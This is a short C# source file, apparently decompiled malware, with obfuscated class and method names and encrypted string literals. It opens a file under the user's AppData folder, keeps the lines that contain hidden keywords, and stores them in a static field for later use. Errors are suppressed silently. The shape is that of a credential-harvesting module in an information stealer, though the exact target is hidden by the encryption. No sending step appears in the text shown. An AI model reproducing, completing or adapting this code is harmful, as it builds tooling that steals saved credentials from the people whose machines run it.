using System;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

public class DAPGDN
{
	public class PGDNdll
	{
		public static void GTMYPig()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + LOOTCKC.IPNPIWT("hnPAzLuasbWzqo2ov8y3nrh+z7aWHQ==", "False");
				string text2 = Conversions.ToString(1);
				text2 = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileReader(text).ReadToEnd();
				string text3 = LOOTCKC.IPNPIWT("aYSPlohphI+WiGmEosKykLDAlohphI+WiGmEj5aIaYQc", "False") + Environment.NewLine + Environment.NewLine;
				string[] array = text2.Split(new char[1] { '\r' });
				text2 = null;
				string[] array2 = array;
				foreach (string text4 in array2)
				{
					if (text4.Contains(LOOTCKC.IPNPIWT("d8bT186qudDUmAs=", "False")))
					{
						text3 = text3 + text4 + Environment.NewLine;
					}
					if (text4.Contains(LOOTCKC.IPNPIWT("Y7CuwatlIA==", "False")))
					{
						text3 = text3 + text4 + Environment.NewLine;
					}
					if (text4.Contains(LOOTCKC.IPNPIWT("dMO/2MqvwtDJlQ4=", "False")))
					{
						text3 = text3 + text4 + Environment.NewLine + Environment.NewLine;
					}
				}
				KVPXNIVH.TKQMM = text3 + Environment.NewLine + Environment.NewLine + LOOTCKC.IPNPIWT("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4Ie", "False");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				KVPXNIVH.TKQMM = "";
				ProjectData.ClearProjectError();
			}
		}
	}
}
